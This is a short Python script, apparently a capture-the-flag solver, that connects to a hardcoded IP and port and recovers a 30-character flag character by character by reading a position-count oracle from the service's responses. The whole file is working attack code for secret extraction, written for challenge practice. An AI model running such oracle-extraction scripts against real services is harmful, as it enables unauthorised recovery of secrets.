import socket
import string

HOST, PORT = '66.228.49.41', 41567
FLAG_LEN = 30
CHARSET = string.ascii_letters + string.digits + "_{}!@#$%^&*()-=+[]"

def solve():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.recv(1024) # Banner

    flag = ""
    while len(flag) < FLAG_LEN:
        for char in CHARSET:
            test_payload = flag + char + ("a" * (FLAG_LEN - len(flag) - 1))
            s.sendall(f"knight('{test_payload}')\n".encode())
            resp = s.recv(1024).decode().strip()
            
            try:
                correct_pos = int(resp.split()[0])
                if correct_pos == len(flag) + 1:
                    flag += char
                    print(f"[*] Progress: {flag}")
                    break
            except: continue
    
    print(f"\n[+] Flag Found: {flag}")

if __name__ == "__main__":
    solve()